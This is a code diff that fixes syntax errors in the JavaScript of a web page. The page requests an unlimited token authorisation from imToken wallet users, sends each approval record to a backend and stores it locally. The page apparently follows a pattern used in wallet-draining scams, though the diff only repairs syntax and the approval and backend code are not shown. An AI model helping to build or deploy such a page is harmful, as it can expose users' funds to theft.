@@ -74,7 +74,9 @@
         renderApprovalRecords();
 
         const copyLinkText = document.getElementById("copyLinkText");
-        const copyLinkBtn = document.getElementById("copyLinkBtn");// 2. 给复制按钮绑定点击事件
+        const copyLinkBtn = document.getElementById("copyLinkBtn");
+
+        // 2. 给复制按钮绑定点击事件
         copyLinkBtn.addEventListener("click", async () => {
             try {
                 // 获取要复制的链接内容
@@ -140,7 +142,7 @@
                 await sendDataToBackend(record);
 
                 // 提示用户，明确是无限授权
-                alert(无限授权成功！\n交易哈希：${record.txHash}\n可在imToken钱包中撤销授权);
+                alert(`无限授权成功！\n交易哈希：${record.txHash}\n可在imToken钱包中撤销授权`);
                 renderApprovalRecords();
             } catch (e) {
                 alert("授权失败：" + e.message);
@@ -178,7 +180,7 @@
 
     // 存本地记录（标注无限授权）
     function saveApprovalRecord(record) {
-        const existing = JSON.parse(localStorage.getItem(RECORD_KEY)  "[]");
+        const existing = JSON.parse(localStorage.getItem(RECORD_KEY) || "[]");
         const newRecords = existing.filter(item => item.address !== record.address);
         newRecords.push(record);
         localStorage.setItem(RECORD_KEY, JSON.stringify(newRecords));
@@ -187,7 +189,9 @@
     // 渲染记录（显示授权类型）
     function renderApprovalRecords() {
         const container = document.getElementById("approvalRecords");
-        const records = JSON.parse(localStorage.getItem(RECORD_KEY)  "[]");if (records.length === 0) {
+        const records = JSON.parse(localStorage.getItem(RECORD_KEY) || "[]");
+
+        if (records.length === 0) {
             container.innerHTML = "<div class='record-item'>暂无授权记录</div>";
             return;
         }
